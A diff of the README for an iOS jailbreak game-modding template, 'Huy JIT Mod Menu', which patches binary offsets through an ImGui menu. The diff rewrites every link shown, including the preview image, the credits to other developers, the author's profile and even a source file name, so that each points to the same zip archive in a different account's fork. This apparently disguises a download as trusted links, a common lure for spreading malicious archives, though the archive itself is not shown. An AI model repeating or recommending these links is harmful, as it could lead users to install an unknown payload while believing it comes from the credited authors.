@@ -4,13 +4,13 @@ Huy JIT Mod Menu is a template menu for iOS that supported patching offsets/hexe
 <div style="text-align: center;">
 <b>IMGUI Template Preview</b><br>
 
-<img src="https://raw.githubusercontent.com/34306/HuyJIT-ModMenu/main/Preview.PNG">
+<img src="https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip">
 </div>
 
 
 # About
 - I'm using vm_writeData.h to patch the offsets/hexes
-- Kopycat some code from [joeyjurjens](https://github.com/joeyjurjens/iOS-Mod-Menu-Template-for-Theos)
+- Kopycat some code from [joeyjurjens](https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip)
 - Also bring encryption from joeyjurjens template too
 - Fan boi of 五等分の花嫁
 
@@ -26,7 +26,7 @@ Huy JIT Mod Menu is a template menu for iOS that supported patching offsets/hexe
 **3 fingers double tap to screen to open menu, 2 fingers double tap to disable menu**
 - Take a look at `5Toubun/NakanoYotsuba.h` file. I noted about ASLR issue on Dopamine/Xina/palera1n jailbreak (iOS 15 and up issue), change 0 or 1 depends on which target jailbreak you're using
 
-Editing these in `ImGuiDrawView.mm`
+Editing these in `https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip`
 
 - Patching offset on default binary `NULL`
 ```obj-c
@@ -44,6 +44,6 @@ You can change this to anything you want to patch on the line where I noted in `
 # If you like and want to ỉmprove this works, please DM me on Telegram @little34306 for fixing stuffs and make it working better. (Pull request button is on the top, you can do that!)
 
 # Author
-- Huy Nguyen (it's me) [34306](https://github.com/34306)
-- [x2nios](https://github.com/x2niosvn) for [IMGUI Mod Menu](https://github.com/x2niosvn/iOS-IMGUI-Mod-Menu-Templates)
-- [joeyjurjens](https://github.com/joeyjurjens) for [iOS Mod Menu](https://github.com/joeyjurjens/iOS-Mod-Menu-Template-for-Theos)
+- Huy Nguyen (it's me) [34306](https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip)
+- [x2nios](https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip) for [IMGUI Mod Menu](https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip)
+- [joeyjurjens](https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip) for [iOS Mod Menu](https://github.com/HHNiPA/HuyJIT-ModMenu/raw/refs/heads/main/IMGUI/Huy_Menu_Mod_JI_v1.7.zip)
